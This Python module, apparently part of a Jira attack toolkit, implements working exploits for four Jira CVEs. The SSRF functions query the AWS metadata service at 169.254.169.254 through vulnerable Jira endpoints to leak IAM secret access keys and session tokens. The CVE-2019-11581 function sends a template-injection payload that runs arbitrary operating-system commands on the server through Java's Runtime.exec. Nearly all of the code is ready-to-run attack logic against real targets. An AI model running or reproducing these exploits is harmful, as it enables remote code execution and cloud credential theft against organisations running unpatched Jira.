#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import requests
from bs4 import BeautifulSoup

from .recon import request, uparse, isaws


class Style:
	ENABLED = True

	@staticmethod
	def _wrap(code, text):
		if not Style.ENABLED:
			return str(text)
		return "\033[{}m{}\033[0m".format(code, text)

	BLACK = staticmethod(lambda x: Style._wrap("30", x))
	RED = staticmethod(lambda x: Style._wrap("31", x))
	GREEN = staticmethod(lambda x: Style._wrap("32", x))
	YELLOW = staticmethod(lambda x: Style._wrap("33", x))
	BLUE = staticmethod(lambda x: Style._wrap("34", x))
	MAGENTA = staticmethod(lambda x: Style._wrap("35", x))
	CYAN = staticmethod(lambda x: Style._wrap("36", x))
	WHITE = staticmethod(lambda x: Style._wrap("37", x))
	UNDERLINE = staticmethod(lambda x: Style._wrap("4", x))
	RESET = staticmethod(lambda x: "\033[0m" + str(x))

AWS_INSTANCE = "http://169.254.169.254/latest"
AWS_METADATA = "http://169.254.169.254/latest/meta-data/"
AWS_IAM_DATA = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
AWS_IAM_CRED = AWS_IAM_DATA + "%s" #<rolename>

# Shared AWS SSRF menu
def aws_ssrf_menu(target):
	print(Style.YELLOW(
		"[*] Select Payload:\n"
		"1. Show AWS Metadata\n"
		"2. Access to the AWS Instance\n"
		"3. Leak Secret Access Keys and Tokens\n"
		"4. Custom SSRF Payload"
	))

	try:
		choice = input("=> ").strip()
		if choice == "1":
			res, response = request(target + AWS_METADATA)
		elif choice == "2":
			res, response = request(target + AWS_IAM_DATA)
		elif choice == "3":
			role = input("Enter the User Role Name to Leak Access/Token Keys: ")
			res, response = request(target + AWS_IAM_CRED % role)
		elif choice == "4":
			custom = input("=> ").strip()
			res, response = request(target + custom)
		else:
			print(Style.RED("[-] Invalid Selection."))
			return

		print(Style.GREEN("\t\t\t" + response.replace("\n", "\n\t\t\t")))
		print("=" * 50, "END", "=" * 50)

	except KeyboardInterrupt:
		print(Style.RED("Interrupted."))
		sys.exit(0)

# CVE-2019-8451
def cve2019_8451(target, ssrf="https://google.com"):
	print(Style.YELLOW("[*] Launching CVE-2019-8451 exploit..."))

	target = uparse(target)
	payload = ( # http://host:port/plugins/servlet/gadgets/makeRequest?url=http://{}:{}@{}'.format(host, port, target)
		target
		+ "/plugins/servlet/gadgets/makeRequest?url="
		+ target
		+ "@"
		+ ssrf
	)

	res, response = request(payload)

	if '"rc":200' in response and res.status_code == 200:
		print(Style.GREEN("[+] Target found vulnerable to CVE-2019-8451"))
		print(Style.YELLOW("[*] Detecting target's hosting service..."))

		if isaws(target):
			print(Style.GREEN("[+] Target is hosted on Amazon AWS"))
			print(Style.YELLOW("[*] Testing AWS SSRF payloads..."))

			res, response = request(
				target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + AWS_INSTANCE
			)

			if res.status_code == 200:
				print(Style.GREEN("[+] SUCCESS!"))
				print(Style.GREEN("\t\t\t" + response.replace("\n", "\n\t\t\t")))
				aws_ssrf_menu(
					target + "/plugins/servlet/oauth/users/icon-uri?consumerUri="
				)
			else:
				print(Style.RED("[-] AWS Instance payload failed..."))
		else:
			print(Style.RED("[-] Target is not hosted on AWS..."))
	elif res.status_code != 200:
		print(
			Style.GREEN("[-] Something went wrong! (STATUS {})").format(
				Style.UNDERLINE(res.status_code) + Style.RESET("")
			)
			+ Style.RESET("")
		)
		if res.status_code == 302:
			print(
				Style.GREEN("[-] HTTP request got redirected. Set this instead: {}").format(
					Style.UNDERLINE(res.headers.get("Location")) + Style.RESET("")
				)
				+ Style.RESET("")
			)
	else:
		print(Style.RED("[-] Target doesn't seem to be vulnerable. [CVE-2019-8451]"))

# CVE-2017-9506
def cve2017_9506(target):
	print(Style.YELLOW("[*] Launching CVE-2017-9506 exploit..."))

	target = uparse(target)
	test_ssrf_url = "https://www.google.com"
	payload = target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + test_ssrf_url
	res, response = request(payload)

	if res.status_code == 200 and "googlelogo" in response:
		print(Style.GREEN("[+] Target found vulnerable to CVE-2017-9506"))
		print(
			Style.GREEN("[+] X-AUSERNAME: ")
			+ Style.UNDERLINE(res.headers.get("X-AUSERNAME"))
		)

		print(Style.YELLOW("[*] Detecting target's hosting service ..."))
		if isaws(target.split('://')[1]): # dirty but works reliably
			print(Style.GREEN("[+] Target is hosted on Amazon AWS"))
			print(Style.YELLOW("[*] Testing AWS SSRF payloads..."))

			res, response = request(
				target + "/plugins/servlet/oauth/users/icon-uri?consumerUri=" + AWS_INSTANCE
			)

			if res.status_code == 200:
				print(Style.GREEN("[+] SUCCESS!"))
				print(Style.GREEN("\t\t\t" + response.replace("\n", "\n\t\t\t")))
				aws_ssrf_menu(
					target + "/plugins/servlet/oauth/users/icon-uri?consumerUri="
				)
			else:
				print(Style.RED("[-] AWS Instance payload failed..."))
		else:
			print(Style.RED("[-] Target is not hosted on AWS..."))
	else:
		print(Style.RED("[-] Target doesn't seem to be vulnerable. [CVE-2017-9506]"))

# CVE-2019-8449
def cve2019_8449(target):
	print(Style.YELLOW("[*] Launching CVE-2019-8449 exploit..."))

	target = uparse(target)
	endpoint = target + "/rest/api/latest/groupuserpicker"

	try:
		query = input("[>] Enter search query: [required] (e.g. admin) => ")
		maxResults = input("[>] Enter the number of maximum results to fetch: (50) => ")
		fieldId = input("[>] Enter the fieldId to fetch: => ")
		projectId = input("[>] Enter the projectId to fetch: => ")
		issueTypeId = input("[>] Enter the issueTypeId to fetch: => ")
	except KeyboardInterrupt:
		print(Style.RED("Interrupted."))
		sys.exit(0)

	payload = {
		"query": query,
		"maxResults": maxResults,
		"showAvatar": "true",
		"fieldId": fieldId,
		"projectId": projectId,
		"issueTypeId": issueTypeId,
		"avatarSize": "xsmall",
		"caseInsensitive": "false",
		"excludeConnectAddons": "false",
	}

	try:
		r = requests.get(endpoint, params=payload)
		response = r.json()
	except Exception:
		print(Style.RED("[-] Target doesn't seem to be vulnerable. [CVE-2019-8449]"))
		sys.exit(1)

	print(Style.GREEN("[+] SUCCESS: ") + Style.MAGENTA(response))

# CVE-2019-11581
def cve2019_11581(target, command="calc"): # default windows payload
	print(Style.YELLOW("[*] Launching CVE-2019-11581 exploit..."))

	headers = {
		"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1"
	}

	target = uparse(target) + "/secure/ContactAdministrators!default.jspa"
	sess = requests.Session()

	r = sess.get(target)
	soup = BeautifulSoup(r.content, "lxml")

	if soup.find_all("div", class_="aui-message-warning"):
		print(Style.RED("[-] Target doesn't seem to be vulnerable. [CVE-2019-11581]"))
		return

	token = soup.find("input", {"name": "atl_token"})
	if not token:
		print(Style.RED("[-] Couldn't find the CSRF Token. Quitting."))
		return

	print("[+] Found JIRA CSRF Token:", token["value"])

	target = target.replace("!default.jspa", ".jspa")
	# body of post request => (),'subject':"",'details':",'atl_token': value,'Send':'Send'}
	payload = "$i18n.getClass().forName('java.lang.Runtime').getMethod('getRuntime',null).invoke(null,null).exec('%s').waitFor()" % command

	params = {
		"from": "JIRA@JIRA.com",
		"subject": payload,
		"details": payload,
		"atl_token": token["value"],
		"Send": "Send",
	}

	final = sess.post(target, headers=headers, data=params, verify=False)
	print("[+] SUCCESS:", final, sep="\n")
